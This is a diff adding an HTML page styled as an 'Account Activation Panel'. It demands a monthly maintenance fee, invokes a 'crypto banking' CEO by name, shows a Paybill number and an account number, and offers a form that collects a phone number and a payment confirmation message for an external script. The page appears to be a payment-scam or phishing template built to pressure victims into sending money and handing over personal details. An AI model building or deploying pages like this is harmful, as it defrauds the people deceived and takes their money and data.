@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Page</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+
+body{
+    background:linear-gradient(135deg,#eef2ff,#f9fbff);
+    min-height:100vh;
+    padding:20px 12px;
+}
+
+.profile{
+    position:absolute;
+    top:15px;
+    left:15px;
+    width:60px;
+    height:60px;
+    border-radius:50%;
+    overflow:hidden;
+    border:2px solid #fff;
+    box-shadow:0 4px 12px rgba(0,0,0,0.1);
+}
+.profile img{width:100%;height:100%;object-fit:cover;}
+
+.container{
+    max-width:480px;
+    margin:0 auto;
+    text-align:center;
+}
+
+h1{
+    font-size:20px;
+    margin-bottom:18px;
+    font-weight:700;
+}
+
+.story{
+    background:#fff;
+    padding:15px;
+    border-radius:12px;
+    box-shadow:0 8px 20px rgba(0,0,0,0.05);
+    margin-bottom:22px;
+    font-size:13px;
+    line-height:1.5;
+}
+
+.hello-section{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:10px;
+    margin-bottom:25px;
+}
+
+.hello-btn{
+    width:140px;
+    padding:7px;
+    font-size:12px;
+    border:none;
+    border-radius:8px;
+    background:#007bff;
+    color:#fff;
+    font-weight:600;
+}
+
+.form-section{
+    background:#fff;
+    padding:18px;
+    border-radius:12px;
+    box-shadow:0 10px 25px rgba(0,0,0,0.06);
+}
+
+.form-section h3{
+    margin-bottom:10px;
+    font-size:16px;
+}
+
+input, textarea{
+    width:100%;
+    padding:9px;
+    margin-top:10px;
+    border-radius:8px;
+    border:1px solid #ddd;
+    font-size:13px;
+}
+
+.submit-btn{
+    width:100%;
+    padding:10px;
+    margin-top:15px;
+    border:none;
+    border-radius:8px;
+    background:#28a745;
+    color:#fff;
+    font-weight:600;
+    font-size:13px;
+}
+
+.status{
+    margin-top:12px;
+    font-size:13px;
+    font-weight:600;
+    min-height:20px;
+}
+</style>
+</head>
+<body>
+
+<div class="profile">
+    <img src="images (2).jpeg" alt="Profile">
+</div>
+
+<div class="container">
+
+    <h1>ACCOUNT ACTIVATION PANEL</h1>
+
+    <div class="story">
+        Monthly mantainance fee applies to maintain services. Payment is due monthly. Unpaid fees accumulate. Settle outstanding balances promptly to avoid disruption. Covers maintenance costs. Pay now to keep services active.<br><br>crypto banking<br><strong>CEO peter Ndegwa S.</strong>
+        
+    </div>
+
+    <div class="hello-section">
+        <button class="hello-btn">Paybill:71477
+        </button>
+        <button class="hello-btn">Account Number: 420200835044</button>
+    </div>
+
+    <div class="form-section">
+        <h3>Confirm Payment</h3>
+        <input type="text" id="username" placeholder="Phone Number">
+        <textarea id="comment" rows="2" placeholder="Submit payment message to confirm details"></textarea>
+        <button class="submit-btn" onclick="submitComment()">Submit</button>
+        <div class="status" id="status"></div>
+    </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
